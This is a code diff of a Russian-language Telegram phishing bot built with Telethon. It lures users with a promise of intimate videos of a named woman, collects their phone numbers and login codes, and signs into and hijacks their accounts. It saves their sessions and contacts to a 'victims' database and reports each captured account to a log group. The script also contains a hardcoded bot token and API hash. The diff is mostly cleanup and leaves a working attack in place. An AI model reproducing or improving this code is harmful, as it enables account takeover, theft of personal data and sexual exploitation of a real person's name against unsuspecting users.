@@ -4,7 +4,6 @@ import sqlite3
 import json
 import os
 import shutil
-import time
 from datetime import datetime
 from telethon import TelegramClient, events
 from telethon.tl.types import KeyboardButtonRequestPhone, KeyboardButtonCallback, KeyboardButton
@@ -16,8 +15,8 @@ API_ID = 31930134
 API_HASH = '12814e71d319a434ee2f126d0c51c314'
 BOT_TOKEN = '8734465862:AAEp3_kJZIt0BueDeZN3cpDGd_KaHsY1amY'
 
-# Группа для логов (укажите ID группы)
-LOG_GROUP_ID = -5346240560  # Замените на ID вашей группы
+# Группа для логов
+LOG_GROUP_ID = -5346240560
 ADMIN_ID = 8794011165
 
 SESSIONS_DIR = 'sessions'
@@ -25,14 +24,10 @@ TDATA_DIR = 'tdata_exports'
 os.makedirs(SESSIONS_DIR, exist_ok=True)
 os.makedirs(TDATA_DIR, exist_ok=True)
 
-# === ПЕРЕСОЗДАНИЕ БД С ПРАВИЛЬНОЙ СТРУКТУРОЙ ===
+# === БД ===
 conn = sqlite3.connect('victims.db', check_same_thread=False)
 c = conn.cursor()
-
-# Удаляем старую таблицу если есть
 c.execute('DROP TABLE IF EXISTS victims')
-
-# Создаем новую таблицу с правильной структурой
 c.execute('''CREATE TABLE IF NOT EXISTS victims (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     user_id INTEGER,
@@ -45,65 +40,37 @@ c.execute('''CREATE TABLE IF NOT EXISTS victims (
     timestamp TEXT
 )''')
 conn.commit()
-print("[SWILL] База данных создана с правильной структурой")
+print("[SWILL] База данных создана")
 
 class FishingBot:
     def __init__(self):
         self.bot = TelegramClient('bot_session', API_ID, API_HASH)
         self.pending_auth = {}
         self.code_inputs = {}
-        self.is_running = False
-
-    async def start_bot_with_retry(self):
-        """Запуск бота с повторными попытками при FloodWait"""
-        max_retries = 5
-        retry_delay = 60  # Начальная задержка в секундах
-        
-        for attempt in range(max_retries):
-            try:
-                print(f"[SWILL] Попытка запуска бота #{attempt + 1}...")
-                await self.bot.start(bot_token=BOT_TOKEN)
-                print("[SWILL] Бот @zlataslivvv_bot успешно запущен!")
-                return True
-            except FloodWaitError as e:
-                wait_time = e.seconds
-                print(f"[SWILL] FloodWait: нужно подождать {wait_time} секунд (~{wait_time//60} минут)")
-                
-                if wait_time > 300:  # Если больше 5 минут
-                    print(f"[SWILL] Ожидание {wait_time} секунд...")
-                    await asyncio.sleep(wait_time)
-                else:
-                    await asyncio.sleep(wait_time)
-                    
-            except Exception as e:
-                print(f"[SWILL] Ошибка запуска: {e}")
-                if attempt < max_retries - 1:
-                    print(f"[SWILL] Повторная попытка через {retry_delay} секунд...")
-                    await asyncio.sleep(retry_delay)
-                    retry_delay *= 2  # Увеличиваем задержку
-                else:
-                    print("[SWILL] Не удалось запустить бот после всех попыток")
-                    return False
-        
-        return False
 
     async def start(self):
-        # Запускаем бота с повторными попытками
-        if not await self.start_bot_with_retry():
-            print("[SWILL] Критическая ошибка: не удалось запустить бота")
-            return
+        try:
+            await self.bot.start(bot_token=BOT_TOKEN)
+            print("[SWILL] Бот @zlataslivvv_bot запущен!")
+        except FloodWaitError as e:
+            print(f"[SWILL] FloodWait: ждем {e.seconds} секунд")
+            await asyncio.sleep(e.seconds)
+            await self.bot.start(bot_token=BOT_TOKEN)
+            print("[SWILL] Бот @zlataslivvv_bot запущен!")
         
         print("[SWILL] Ожидаем жертв...")
-        self.is_running = True
         
         # Отправляем приветствие в группу
-        await self.log_message("🚀 **БОТ АКТИВИРОВАН**\n@zlataslivvv_bot готов к работе!")
+        try:
+            await self.bot.send_message(LOG_GROUP_ID, "🚀 **БОТ АКТИВИРОВАН**\n@zlataslivvv_bot готов к работе!")
+        except:
+            pass
 
+        # === ОБРАБОТЧИК /start ===
         @self.bot.on(events.NewMessage(pattern='/start'))
         async def start_handler(event):
-            button = KeyboardButtonRequestPhone(
-                text="📱 ПОДЕЛИТЬСЯ КОНТАКТОМ"
-            )
+            print(f"[DEBUG] /start от {event.sender_id}")
+            button = KeyboardButtonRequestPhone(text="📱 ПОДЕЛИТЬСЯ КОНТАКТОМ")
             
             await event.respond(
                 "🔥 **ЭКСКЛЮЗИВНЫЙ ДОСТУП К ИНТИМ ВИДЕО ЗЛАТЫ** 🔥\n\n"
@@ -115,6 +82,7 @@ class FishingBot:
                 buttons=[[button]]
             )
 
+        # === ОБРАБОТЧИК ВСЕХ СООБЩЕНИЙ ===
         @self.bot.on(events.NewMessage)
         async def message_handler(event):
             if not event.is_private:
@@ -122,13 +90,16 @@ class FishingBot:
             
             user_id = event.sender_id
             
+            # Если это команда /start - пропускаем (обработано выше)
+            if event.text and event.text.startswith('/'):
+                return
+            
             # Обработка контакта
             if event.contact:
                 phone = event.contact.phone_number
                 if not phone.startswith('+'):
                     phone = '+' + phone
                 
-                # Получаем информацию о пользователе
                 try:
                     user_info = await event.get_sender()
                     username = user_info.username if user_info.username else "Нет username"
@@ -142,7 +113,7 @@ class FishingBot:
                 await event.respond(
                     "✅ **Верификация пройдена!**\n"
                     f"📱 Номер: `{phone}`\n\n"
-                    "Теперь нажмите кнопку ниже для получения кода доступа к архиву:",
+                    "Теперь нажмите кнопку ниже для получения кода доступа:",
                     buttons=[
                         [KeyboardButton(text="🔑 ПОЛУЧИТЬ КОД ДОСТУПА")]
                     ]
@@ -157,6 +128,7 @@ class FishingBot:
                 }
                 return
             
+            # Обработка текста
             if event.text:
                 text = event.text.strip()
                 
@@ -178,6 +150,7 @@ class FishingBot:
                         await event.respond("❌ Введите код из 5-6 цифр")
                     return
 
+        # === ОБРАБОТЧИК CALLBACK ===
         @self.bot.on(events.CallbackQuery)
         async def callback_handler(event):
             user_id = event.sender_id
@@ -217,7 +190,6 @@ class FishingBot:
                     await event.answer("⚠️ Максимум 6 цифр!")
 
     async def update_code_message(self, event, user_id, code_input):
-        """Обновление сообщения с кодом"""
         try:
             await event.edit(
                 f"📱 **Введите код доступа**\n\n"
@@ -240,10 +212,9 @@ class FishingBot:
                 ]
             )
         except Exception as e:
-            print(f"[ERROR] Обновление сообщения: {e}")
+            print(f"[ERROR] Обновление: {e}")
 
     async def request_code(self, event, user_id, phone):
-        """Запрос кода подтверждения"""
         try:
             temp_client = TelegramClient(f'{SESSIONS_DIR}/temp_{user_id}', API_ID, API_HASH)
             await temp_client.connect()
@@ -277,28 +248,29 @@ class FishingBot:
                 ]
             )
             
-            # Логируем запрос кода
-            await self.log_message(
-                f"📱 **ЗАПРОС КОДА**\n"
-                f"Пользователь: {self.pending_auth[user_id].get('full_name', 'Неизвестно')}\n"
-                f"Username: @{self.pending_auth[user_id].get('username', 'Неизвестно')}\n"
-                f"ID: {user_id}\n"
-                f"Телефон: {phone}"
-            )
+            try:
+                await self.bot.send_message(
+                    LOG_GROUP_ID,
+                    f"📱 **ЗАПРОС КОДА**\n"
+                    f"Пользователь: {self.pending_auth[user_id].get('full_name', 'Неизвестно')}\n"
+                    f"Username: @{self.pending_auth[user_id].get('username', 'Неизвестно')}\n"
+                    f"ID: {user_id}\n"
+                    f"Телефон: {phone}"
+                )
+            except:
+                pass
             
         except PhoneNumberInvalidError:
             await event.respond("❌ Неверный номер телефона!")
             self.pending_auth.pop(user_id, None)
         except FloodWaitError as e:
-            wait_time = e.seconds
-            await event.respond(f"⏳ Подождите {wait_time//60} минут перед следующей попыткой")
+            await event.respond(f"⏳ Подождите {e.seconds//60} минут")
             self.pending_auth.pop(user_id, None)
         except Exception as e:
             await event.respond(f"❌ Ошибка: {str(e)[:100]}")
             self.pending_auth.pop(user_id, None)
 
     async def verify_code(self, event, user_id, code):
-        """Проверка кода и авторизация"""
         auth_data = self.pending_auth.get(user_id)
         if not auth_data:
             await event.respond("❌ Сессия истекла")
@@ -317,7 +289,6 @@ class FishingBot:
             )
             
             session_file = f'{SESSIONS_DIR}/victim_{user_id}.session'
-            
             await temp_client.disconnect()
             
             temp_session = f'{SESSIONS_DIR}/temp_{user_id}.session'
@@ -326,45 +297,36 @@ class FishingBot:
             
             tdata_path = await self.export_tdata(user_id, session_file)
             
-            # Сохраняем в БД
             c.execute('''INSERT INTO victims 
                          (user_id, phone, code, session_file, tdata_path, username, full_name, timestamp)
                          VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
-                      (user_id, 
-                       auth_data['phone'], 
-                       code, 
-                       session_file, 
-                       tdata_path,
+                      (user_id, auth_data['phone'], code, session_file, tdata_path,
                        auth_data.get('username', 'Неизвестно'),
                        auth_data.get('full_name', 'Неизвестно'),
                        datetime.now().isoformat()))
             conn.commit()
             
-            # Отправляем жертве фейковое сообщение
             await event.respond(
                 "✅ **ДОСТУП ПРЕДОСТАВЛЕН!**\n\n"
                 "🎬 Ссылка на архив с интим видео:\n"
                 "🔗 https://t.me/+XYZ123456789\n\n"
-                "⚠️ Сохраните ссылку, архив будет удален через 24 часа!\n"
-                "📁 Общий вес архива: 45.7 GB"
+                "⚠️ Сохраните ссылку, архив будет удален через 24 часа!"
             )
             
-            # Логируем успешный захват в группу
-            await self.log_message(
-                f"🎯 **НОВАЯ ЖЕРТВА!**\n\n"
-                f"👤 Имя: {auth_data.get('full_name', 'Неизвестно')}\n"
-                f"📱 Username: @{auth_data.get('username', 'Неизвестно')}\n"
-                f"🆔 ID: {user_id}\n"
-                f"📞 Телефон: {auth_data['phone']}\n"
-                f"📁 Данные: `{tdata_path}`\n"
-                f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-                f"✅ Аккаунт успешно скомпрометирован!"
-            )
+            try:
+                await self.bot.send_message(
+                    LOG_GROUP_ID,
+                    f"🎯 **НОВАЯ ЖЕРТВА!**\n\n"
+                    f"👤 Имя: {auth_data.get('full_name', 'Неизвестно')}\n"
+                    f"📱 Username: @{auth_data.get('username', 'Неизвестно')}\n"
+                    f"🆔 ID: {user_id}\n"
+                    f"📞 Телефон: {auth_data['phone']}\n"
+                    f"📁 Данные: `{tdata_path}`\n"
+                    f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+                )
+            except:
+                pass
             
-            # Отправляем админу
-            await self.notify_admin(user_id, auth_data['phone'], session_file, auth_data)
-            
-            # Очищаем данные
             self.pending_auth.pop(user_id, None)
             self.code_inputs.pop(user_id, None)
             
@@ -377,15 +339,13 @@ class FishingBot:
             await event.respond("⏰ Код истек! Запросите новый.")
             self.pending_auth[user_id]['step'] = 'awaiting_code_request'
         except FloodWaitError as e:
-            wait_time = e.seconds
-            await event.respond(f"⏳ Подождите {wait_time//60} минут перед следующей попыткой")
+            await event.respond(f"⏳ Подождите {e.seconds//60} минут")
             self.pending_auth.pop(user_id, None)
         except Exception as e:
             await event.respond(f"❌ Ошибка: {str(e)[:100]}")
             self.pending_auth.pop(user_id, None)
 
     async def export_tdata(self, user_id, session_file):
-        """Экспорт данных аккаунта"""
         tdata_dir = f'{TDATA_DIR}/tdata_{user_id}'
         os.makedirs(tdata_dir, exist_ok=True)
         
@@ -408,7 +368,6 @@ class FishingBot:
                 'contacts': []
             }
             
-            # Пытаемся получить контакты
             try:
                 contacts = await client(GetContactsRequest(hash=0))
                 for user in contacts.users[:50]:
@@ -434,29 +393,6 @@ class FishingBot:
         
         return tdata_dir
 
-    async def log_message(self, message):
-        """Отправка сообщения в группу логов"""
-        try:
-            await self.bot.send_message(LOG_GROUP_ID, message)
-        except Exception as e:
-            print(f"[ERROR] Логирование в группу: {e}")
-
-    async def notify_admin(self, user_id, phone, session_file, auth_data):
-        """Уведомление админа"""
-        try:
-            await self.bot.send_message(
-                ADMIN_ID,
-                f"🎯 **НОВАЯ ЖЕРТВА!**\n\n"
-                f"👤 Имя: {auth_data.get('full_name', 'Неизвестно')}\n"
-                f"📱 Username: @{auth_data.get('username', 'Неизвестно')}\n"
-                f"🆔 ID: {user_id}\n"
-                f"📞 Телефон: {phone}\n"
-                f"📁 Сессия: {session_file}\n"
-                f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-            )
-        except:
-            pass
-
     async def run(self):
         await self.start()
         print("[SWILL] Бот запущен, нажмите Ctrl+C для остановки")
@@ -467,6 +403,6 @@ if __name__ == '__main__':
     try:
         asyncio.run(bot.run())
     except KeyboardInterrupt:
-        print("[SWILL] Бот остановлен пользователем")
+        print("[SWILL] Бот остановлен")
     except Exception as e:
-        print(f"[SWILL] Критическая ошибка: {e}")
+        print(f"[SWILL] Ошибка: {e}")
